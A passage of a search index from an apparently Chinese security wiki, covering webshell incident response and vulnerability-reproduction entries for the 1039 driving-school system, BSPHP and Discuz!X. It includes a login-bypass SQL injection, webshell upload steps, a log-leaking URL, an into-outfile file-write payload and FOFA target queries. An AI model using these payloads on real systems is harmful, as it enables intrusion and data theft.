\u7ecf\u6f0f\u6d1e\u590d\u73b0\uff0c\u786e\u8ba4UEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 5\u3001\u8fd8\u539f\u653b\u51fb\u8005\u884c\u4e3a \u901a\u8fc7\u76f8\u5173\u6587\u4ef6\u7684\u8bbf\u95ee\u8bb0\u5f55\u8fdb\u884c\u5173\u8054\u5206\u6790\uff0c\u653b\u51fb\u8005\u901a\u8fc7 ueditor\u7f16\u8f91\u5668\u6210\u529f\u4e0a\u4f20webshell\u3002","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC9%E7%AF%87%EF%BC%9A%E7%BC%96%E8%BE%91%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6/#0x03-\u4e8b\u4ef6\u5904\u7406","text":"1\u3001 \u5220\u9664Webshell \u6e05\u695a\u5df2\u53d1\u73b0\u7684webshell\uff0c\u5e76\u5c1d\u8bd5\u67e5\u627e\u53ef\u80fd\u9690\u85cf\u7684webshell\u3002 2\u3001\u4ee3\u7801\u5b8c\u6574\u6027\u9a8c\u8bc1 \u6211\u4eec\u6765\u601d\u8003\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u514d\u6740\u7684Webshell\u9690\u85cf\u5728\u6570\u4ee5\u4e07\u884c\u7684\u4ee3\u7801\u4e2d\uff0c\u600e\u4e48\u641e\uff1f \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u68c0\u67e5\u7f51\u7ad9\u7684\u6e90\u7801\u662f\u5426\u88ab\u7be1\u6539\u8fc7\u3002 \u64cd\u4f5c\u8fc7\u7a0b\uff1a \u901a\u8fc7\u67e5\u770b\u670d\u52a1\u5668\u4e0a\u5df2\u90e8\u7f72\u7684\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u627e\u7814\u53d1\u540c\u4e8b\u8981\u540c\u6837\u7248\u672c\u7684\u4ee3\u7801\u3002\u628a\u7eaf\u51c0\u6e90\u7801\u7684\u6240\u6709\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u518d\u5230\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u6b21hash\u503c\uff0c\u901a\u8fc7\u6bd4\u5bf9hash\u503c\uff0c\u8f93\u51fa\u65b0\u521b\u5efa\u7684/\u88ab\u4fee\u6539\u8fc7\u7684/\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 3\u3001\u7cfb\u7edf\u5165\u4fb5\u6392\u67e5 \u5bf9\u7cfb\u7edf\u505a\u4e00\u4e2a\u6574\u4f53\u6392\u67e5\uff0c\u786e\u8ba4\u662f\u5426\u5b58\u5728\u540e\u95e8 4\u3001\u4ee3\u7801\u4fee\u590d \u53cd\u9988\u7ed9\u76f8\u5173\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002","title":"0x03 \u4e8b\u4ef6\u5904\u7406"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC07%E7%AB%A0%EF%BC%9A%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%BA%93/","text":"\u7b2c07\u7ae0\uff1a\u6076\u610f\u6837\u672c\u5e93 \u00b6 \u6536\u96c6\u4e00\u4e9b\u6709\u610f\u601d\u7684\u6076\u610f\u6837\u672c\uff0c\u5305\u62ec\u514d\u6740\u7684webshell\u3001\u540e\u95e8\u75c5\u6bd2\u3001rookit\u7b49\u3002 \u5df2\u6536\u96c6\u514d\u6740\u7684Webshell\u6837\u672c\u6570\u91cf\uff1a200+\uff0c\u5df2\u6536\u96c6\u7684\u75c5\u6bd2\u6837\u672c\uff1a\u8815\u866b\u3001\u76d6\u8328\u6728\u9a6c\u3001\u6316\u77ff\u7b49\uff0c\u5f85\u5206\u7c7b\u6574\u7406\u4e0a\u4f20\u3002 \u6162\u6162\u79ef\u7d2f\u5427\uff0c\u53ef\u4ee5\u7528\u6765\u642d\u5efa\u5e94\u6025\u9776\u673a\u3001\u9a8c\u8bc1\u5b89\u5168\u5f15\u64ce\u67e5\u6740\u80fd\u529b\u7b49\uff0c\u8fd9\u5e94\u8be5\u4f1a\u633a\u6709\u610f\u601d\u7684\u3002","title":"\u7b2c07\u7ae0\uff1a\u6076\u610f\u6837\u672c\u5e93"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC07%E7%AB%A0%EF%BC%9A%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%BA%93/#\u7b2c07\u7ae0\u6076\u610f\u6837\u672c\u5e93","text":"\u6536\u96c6\u4e00\u4e9b\u6709\u610f\u601d\u7684\u6076\u610f\u6837\u672c\uff0c\u5305\u62ec\u514d\u6740\u7684webshell\u3001\u540e\u95e8\u75c5\u6bd2\u3001rookit\u7b49\u3002 \u5df2\u6536\u96c6\u514d\u6740\u7684Webshell\u6837\u672c\u6570\u91cf\uff1a200+\uff0c\u5df2\u6536\u96c6\u7684\u75c5\u6bd2\u6837\u672c\uff1a\u8815\u866b\u3001\u76d6\u8328\u6728\u9a6c\u3001\u6316\u77ff\u7b49\uff0c\u5f85\u5206\u7c7b\u6574\u7406\u4e0a\u4f20\u3002 \u6162\u6162\u79ef\u7d2f\u5427\uff0c\u53ef\u4ee5\u7528\u6765\u642d\u5efa\u5e94\u6025\u9776\u673a\u3001\u9a8c\u8bc1\u5b89\u5168\u5f15\u64ce\u67e5\u6740\u80fd\u529b\u7b49\uff0c\u8fd9\u5e94\u8be5\u4f1a\u633a\u6709\u610f\u601d\u7684\u3002","title":"\u7b2c07\u7ae0\uff1a\u6076\u610f\u6837\u672c\u5e93"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","text":"\u6f0f\u6d1e\u590d\u73b0\u90e8\u5206 \u00b6 CMS\u6f0f\u6d1e\u3001Web\u5e94\u7528\u6f0f\u6d1e\u3001Web\u670d\u52a1\u5668\u6f0f\u6d1e\u3001\u5f00\u53d1\u6846\u67b6\u6f0f\u6d1e\u3001\u5f00\u53d1\u8bed\u8a00\u6f0f\u6d1e\u3001\u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\u3001\u670d\u52a1\u5668\u5e94\u7528\u6f0f\u6d1e\u3001\u7f51\u7edc\u8bbe\u5907\u6f0f\u6d1e","title":"\u76f8\u5173\u4ecb\u7ecd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#\u6f0f\u6d1e\u590d\u73b0\u90e8\u5206","text":"CMS\u6f0f\u6d1e\u3001Web\u5e94\u7528\u6f0f\u6d1e\u3001Web\u670d\u52a1\u5668\u6f0f\u6d1e\u3001\u5f00\u53d1\u6846\u67b6\u6f0f\u6d1e\u3001\u5f00\u53d1\u8bed\u8a00\u6f0f\u6d1e\u3001\u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\u3001\u670d\u52a1\u5668\u5e94\u7528\u6f0f\u6d1e\u3001\u7f51\u7edc\u8bbe\u5907\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u590d\u73b0\u90e8\u5206"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%20CNVD-2020-31494/","text":"1039\u5bb6\u6821\u901a \u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7 CNVD-2020-31494 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u662f\u4e00\u5bb6\u4e13\u6ce8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u3001\u9a7e\u6821\u79fb\u52a8\u529e\u516c\u7cfb\u7edf\u3001\u9a7e\u6821\u7ba1\u7406\u8f6f\u4ef6\u3001\u9a7e\u6821\u62db\u751f\u5c0f\u7a0b\u5e8f\u5f00\u53d1\u7b49,\u4e3a\u9a7e\u6821\u63d0\u4f9b\u65e0\u6b7b\u89d2\u7684\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u89e3\u51b3\u65b9\u6848\u3002 \u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] 1039\u5bb6\u6821\u901a v1.0 - v6.0 FOFA \u00b6 [!NOTE] title=\"\u5b66\u5458\u767b\u5f55_1039\u5bb6\u6821\u901a\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u7ba1\u7406\u5458\u767b\u5f55\u63a5\u53e3\u4e3a /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx \u8d26\u53f7\u5bc6\u7801\u4e3a\u5982\u4e0b\u5373\u53ef\u767b\u5f55 user:peiqi pass:' or ''='","title":"1039\u5bb6\u6821\u901a \u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7 CNVD-2020-31494"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%20CNVD-2020-31494/#1039\u5bb6\u6821\u901a-\u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7-cnvd-2020-31494","text":"","title":"1039\u5bb6\u6821\u901a \u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7 CNVD-2020-31494"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%20CNVD-2020-31494/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u662f\u4e00\u5bb6\u4e13\u6ce8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u3001\u9a7e\u6821\u79fb\u52a8\u529e\u516c\u7cfb\u7edf\u3001\u9a7e\u6821\u7ba1\u7406\u8f6f\u4ef6\u3001\u9a7e\u6821\u62db\u751f\u5c0f\u7a0b\u5e8f\u5f00\u53d1\u7b49,\u4e3a\u9a7e\u6821\u63d0\u4f9b\u65e0\u6b7b\u89d2\u7684\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u89e3\u51b3\u65b9\u6848\u3002 \u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%20CNVD-2020-31494/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] 1039\u5bb6\u6821\u901a v1.0 - v6.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%20CNVD-2020-31494/#fofa","text":"[!NOTE] title=\"\u5b66\u5458\u767b\u5f55_1039\u5bb6\u6821\u901a\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%20CNVD-2020-31494/#\u6f0f\u6d1e\u590d\u73b0","text":"\u7ba1\u7406\u5458\u767b\u5f55\u63a5\u53e3\u4e3a /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx \u8d26\u53f7\u5bc6\u7801\u4e3a\u5982\u4e0b\u5373\u53ef\u767b\u5f55 user:peiqi pass:' or ''='","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"1039\u5bb6\u6821\u901a \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u662f\u4e00\u5bb6\u4e13\u6ce8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u3001\u9a7e\u6821\u79fb\u52a8\u529e\u516c\u7cfb\u7edf\u3001\u9a7e\u6821\u7ba1\u7406\u8f6f\u4ef6\u3001\u9a7e\u6821\u62db\u751f\u5c0f\u7a0b\u5e8f\u5f00\u53d1\u7b49,\u4e3a\u9a7e\u6821\u63d0\u4f9b\u65e0\u6b7b\u89d2\u7684\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u89e3\u51b3\u65b9\u6848\u3002 \u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u540e\u53f0\u7f16\u8f91\u5668\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6293\u5305\u7684\u65b9\u5f0f\u5f97\u77e5webshell\u8def\u5f84\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u5165\u4fb5 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] 1039\u5bb6\u6821\u901a v1.0 - v6.0 FOFA \u00b6 [!NOTE] title=\"\u5b66\u5458\u767b\u5f55_1039\u5bb6\u6821\u901a\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528 1039\u5bb6\u6821\u901a \u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7 CNVD-2020-31494 \u767b\u5f55\u540e\u53f0\u540e\u627e\u5230\u7f16\u8f91\u5668\u9875\u9762 Burp\u6293\u5305\u4e0a\u4f20 asp webshell\u6728\u9a6c \u53ef\u4ee5\u5f97\u77e5webshell\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u51b0\u874e\u9ed8\u8ba4\u9a6c\uff0c\u4f7f\u7528\u51b0\u874e\u8fde\u63a5","title":"1039\u5bb6\u6821\u901a \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#1039\u5bb6\u6821\u901a-\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"","title":"1039\u5bb6\u6821\u901a \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u662f\u4e00\u5bb6\u4e13\u6ce8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u3001\u9a7e\u6821\u79fb\u52a8\u529e\u516c\u7cfb\u7edf\u3001\u9a7e\u6821\u7ba1\u7406\u8f6f\u4ef6\u3001\u9a7e\u6821\u62db\u751f\u5c0f\u7a0b\u5e8f\u5f00\u53d1\u7b49,\u4e3a\u9a7e\u6821\u63d0\u4f9b\u65e0\u6b7b\u89d2\u7684\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u89e3\u51b3\u65b9\u6848\u3002 \u5317\u4eac1039\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u9a7e\u6821\u7ba1\u7406\u7cfb\u7edf\u540e\u53f0\u7f16\u8f91\u5668\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6293\u5305\u7684\u65b9\u5f0f\u5f97\u77e5webshell\u8def\u5f84\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u5165\u4fb5","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] 1039\u5bb6\u6821\u901a v1.0 - v6.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u5b66\u5458\u767b\u5f55_1039\u5bb6\u6821\u901a\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/1039%E5%AE%B6%E6%A0%A1%E9%80%9A/1039%E5%AE%B6%E6%A0%A1%E9%80%9A%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528 1039\u5bb6\u6821\u901a \u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7 CNVD-2020-31494 \u767b\u5f55\u540e\u53f0\u540e\u627e\u5230\u7f16\u8f91\u5668\u9875\u9762 Burp\u6293\u5305\u4e0a\u4f20 asp webshell\u6728\u9a6c \u53ef\u4ee5\u5f97\u77e5webshell\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u51b0\u874e\u9ed8\u8ba4\u9a6c\uff0c\u4f7f\u7528\u51b0\u874e\u8fde\u63a5","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"BSPHP \u672a\u6388\u6743\u8bbf\u95ee \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 BSPHP \u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee \u6cc4\u9732\u7528\u6237 IP \u548c \u8d26\u6237\u540d\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] BSPHP FOFA \u00b6 [!NOTE] \"BSPHP\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u5982\u4e0bURL\uff0c\u6cc4\u9732\u7528\u6237\u540d\u4e0e\u767b\u5f55IP http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0\u2018","title":"BSPHP \u672a\u6388\u6743\u8bbf\u95ee \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#bsphp-\u672a\u6388\u6743\u8bbf\u95ee-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"BSPHP \u672a\u6388\u6743\u8bbf\u95ee \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"BSPHP \u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee \u6cc4\u9732\u7528\u6237 IP \u548c \u8d26\u6237\u540d\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] BSPHP","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] \"BSPHP\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u5982\u4e0bURL\uff0c\u6cc4\u9732\u7528\u6237\u540d\u4e0e\u767b\u5f55IP http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0\u2018","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X/Discuz%21X%20%E5%B0%8F%E4%BA%8E3.4%20R20191201%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"Discuz!X <3.4 R20191201 \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4e0d\u4e45\u4ee5\u524dDiscuz!X\u7684\u540e\u53f0\u62ab\u9732\u4e86\u4e00\u4e2asql\u6ce8\u5165\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u4e5f\u8981\u611f\u8c22\u6f0f\u6d1e\u7684\u53d1\u73b0\u548c\u7814\u7a76\u8005\uff08\u65e0\u7cd6\u7684kn1f3)\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Discuz!X <3.4 R20191201 \u7248\u672c \u73af\u5883\u642d\u5efa \u00b6 \u767e\u5ea6\u4e91\u76d8\u4e0b\u8f7d\u94fe\u63a5 \u5bc6\u7801: 0515 \u5c06 **upload**\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u62f7\u5165**phpstudy**\u4e0b\u7684WWW\u76ee\u5f55\u6253\u5f00\u7f51\u7ad9\u6309\u7167\u6b65\u9aa4\u5b89\u88c5\u5c31\u884c\u4e86 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6765\u5230\u540e\u53f0\u9875\u9762, \u5728 UCenter \u5e94\u7528 ID \u4f4d\u7f6e\u7684\u53c2\u6570\u6dfb\u52a0\u5355\u5f15\u53f7\u5e76\u6293\u5305 \u53d1\u73b0\u51fa\u73b0SQL\u8bed\u53e5\u62a5\u9519 \u4f7f\u7528\u62a5\u9519\u6ce8\u5165\u53bb\u83b7\u53d6\u7248\u672c\u53f7 \u8fd9\u91cc\u7684\u53c2\u6570\u4e3a settingnew[uc][appid] \u67e5\u770b\u6587\u4ef6 \\source\\admincp\\admincp_setting.php \uff0c \u57282677\u884c\u627e\u5230\u4e86\u8f93\u5165\u70b9 \u6839\u636e\u62a5\u9519\u8bed\u53e5\u627e\u5230SQL\u8bed\u53e5\u6267\u884c\u70b9\uff0c\u5728\u6587\u4ef6**uc_client\\model\\base.php** \u4e2d\u7684 206\u884c \u901a\u8fc7\u8fd9\u91cc\u7684\u8bed\u53e5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 union\u6ce8\u5165 \u7684\u65b9\u6cd5\u6765\u5199\u5165\u6076\u610f\u6587\u4ef6( secure_file_priv\u4e0d\u80fd\u4e3aNull ) 1' union select \"<?php phpinfo();?>\" into outfile 'D:/peiqi.php';--+ \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u7684\u65b9\u6cd5","title":"Discuz!X \u5c0f\u4e8e3.4 R20191201 \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Discuz%21X/Discuz%21X%20%E5%B0%8F%E4%BA%8E3.4%20R20191201%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#discuzx-34-r20191201-\u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"Discuz!X &lt;3.4 R20191201 